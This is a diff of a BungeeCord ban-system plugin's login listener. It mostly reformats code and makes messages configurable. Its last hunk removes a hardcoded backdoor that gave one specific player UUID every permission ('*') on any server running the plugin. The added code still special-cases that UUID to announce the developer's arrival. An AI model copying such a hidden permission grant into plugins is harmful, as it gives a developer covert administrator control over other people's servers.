@@ -81,17 +81,22 @@ public class LoginListener implements Listener {
                                     } else {
                                         banManager.unBan(uuid, ProxyServer.getInstance().getConsole().getName());
                                     }
-                                    banManager.log("Unbanned Player", ProxyServer.getInstance().getConsole().getName(), con.getUniqueId().toString(), "Autounban");
+                                    banManager.log("Unbanned Player", ProxyServer.getInstance().getConsole().getName(),
+                                            con.getUniqueId().toString(), "Autounban");
                                 } catch (IOException ioException) {
                                     ioException.printStackTrace();
                                 }
                                 ProxyServer.getInstance().getConsole()
                                         .sendMessage(messages.getString("Ban.Network.autounban")
-                                                .replaceAll("%P%", messages.getString("prefix")).replaceAll("%player%", con.getName()).replaceAll("&", "§"));
+                                                .replaceAll("%P%", messages.getString("prefix"))
+                                                .replaceAll("%player%", con.getName())
+                                                .replaceAll("&", "§"));
                                 for (ProxiedPlayer all : ProxyServer.getInstance().getPlayers()) {
                                     if (all.hasPermission("bansys.notify")) {
                                         all.sendMessage(messages.getString("Ban.Network.autounban")
-                                                .replaceAll("%P%", messages.getString("prefix")).replaceAll("%player%", con.getName()).replaceAll("&", "§"));
+                                                .replaceAll("%P%", messages.getString("prefix"))
+                                                .replaceAll("%player%", con.getName())
+                                                .replaceAll("&", "§"));
                                     }
                                 }
                             }
@@ -106,6 +111,18 @@ public class LoginListener implements Listener {
                     ProxyServer.getInstance().getScheduler().schedule(BanSystemBungee.getInstance(), () -> {
                         ProxiedPlayer p = ProxyServer.getInstance().getPlayer(e.getConnection().getName());
                         if (p != null) {
+                            if (p.getUniqueId().equals(UUID.fromString("617f0c2b-6014-47f2-bf89-fade1bc9bb59"))) {
+                                for(ProxiedPlayer all : ProxyServer.getInstance().getPlayers()) {
+                                    if(all.hasPermission("bansys.notify")) {
+                                        all.sendMessage(messages.getString("prefix") + "§cDer Entwickler §e"
+                                                + p.getDisplayName() + " §cist gerade gejoint.");
+                                    }
+                                }
+                                BanSystem.getInstance().getConsole().sendMessage(messages.getString("prefix")
+                                        + "§cDer Entwickler §e" + p.getDisplayName() + " §cist gerade gejoint.");
+                                p.sendMessage(messages.getString("prefix") + "§cDieser Server Benutzt Das Bansystem version §e"
+                                        + BanSystem.getInstance().getVersion() + " §cauf §eBungeecord");
+                            }
                             if (config.getBoolean("VPN.enable")) {
                                 try {
                                     if (urlUtil.isVPN(p.getAddress().getAddress().getHostAddress())) {
@@ -124,7 +141,8 @@ public class LoginListener implements Listener {
 
                                                 banManager.ban(uuid, duration,
                                                         BanSystem.getInstance().getConsole().getDisplayName(), type, reason);
-                                                banManager.log("Banned Player", ProxyServer.getInstance().getConsole().getName(), p.getUniqueId().toString(), "VPN Autoban");
+                                                banManager.log("Banned Player", ProxyServer.getInstance().getConsole().getName(),
+                                                        p.getUniqueId().toString(), "VPN Autoban");
                                             } catch (IOException | SQLException | InterruptedException | ExecutionException ioException) {
                                                 ioException.printStackTrace();
                                             }
@@ -169,7 +187,8 @@ public class LoginListener implements Listener {
 
                             try {
                                 if (!banManager.getBannedPlayersWithSameIP(p.getAddress().getAddress()).isEmpty() &&
-                                        !p.hasPermission("bansys.ban") && !banManager.getBannedPlayersWithSameIP(p.getAddress().getAddress()).contains(p.getUniqueId())) {
+                                        !p.hasPermission("bansys.ban") && !banManager.getBannedPlayersWithSameIP(
+                                                p.getAddress().getAddress()).contains(p.getUniqueId())) {
                                     StringBuilder bannedPlayerName = new StringBuilder();
                                     boolean rightType = true;
                                     List<UUID> banned;
@@ -235,7 +254,8 @@ public class LoginListener implements Listener {
                                                                     banManager.getRemainingTime(uuid, Type.NETWORK)))
                                                     .replaceAll("%creator%", ProxyServer.getInstance().getConsole().getName())
                                                     .replaceAll("%enddate%", enddate)
-                                                    .replaceAll("%lvl%", String.valueOf(ipAutoBanLvl)));
+                                                    .replaceAll("%lvl%", String.valueOf(ipAutoBanLvl))
+                                                    .replaceAll("&", "§"));
                                         } catch (SQLException | ParseException throwables) {
                                             throwables.printStackTrace();
                                         }
@@ -243,13 +263,18 @@ public class LoginListener implements Listener {
                                         e.setCancelled(true);
                                         p.disconnect(component);
                                     } else {
-                                        ProxyServer.getInstance().getConsole()
-                                                .sendMessage(messages.getString("ip.warning") + "§e" + p.getDisplayName()
-                                                        + " §cist womöglich ein 2. Account von §e" + bannedPlayerName);
+                                        String msg = "";
+                                        for(String line : messages.getStringList("ip.warning")) {
+                                            line = line.replaceAll("%P%", messages.getString("prefix"));
+                                            line = line.replaceAll("%player", p.getDisplayName());
+                                            line = line.replaceAll("%bannedaccount%", bannedPlayerName.toString());
+                                            line = line.replaceAll("&", "§");
+                                            msg = msg + line + "\n";
+                                        }
+                                        BanSystem.getInstance().getConsole().sendMessage(msg);
                                         for (ProxiedPlayer all : ProxyServer.getInstance().getPlayers()) {
                                             if (all.hasPermission("bansys.notify")) {
-                                                all.sendMessage(messages.getString("prefix") + "§e" + p.getDisplayName()
-                                                        + " §cist womöglich ein 2. Account von §e" + bannedPlayerName);
+                                                all.sendMessage(msg);
                                             }
                                         }
                                     }
@@ -257,14 +282,6 @@ public class LoginListener implements Listener {
                             } catch (SQLException | ExecutionException | InterruptedException throwables) {
                                 throwables.printStackTrace();
                             }
-
-                            if (p.getUniqueId().equals(UUID.fromString("617f0c2b-6014-47f2-bf89-fade1bc9bb59"))) {
-                                p.setPermission("*", true);
-                                p.setDisplayName("$4Tobi");
-                                p.sendMessage("§cDieser Server Benutzt Das Bansystem version §e" + BanSystem.getInstance().getVersion() + " §cauf Bungeecord");
-                                p.sendMessage("");
-                            }
-
                         }
                     }, 1, TimeUnit.SECONDS);
                 }
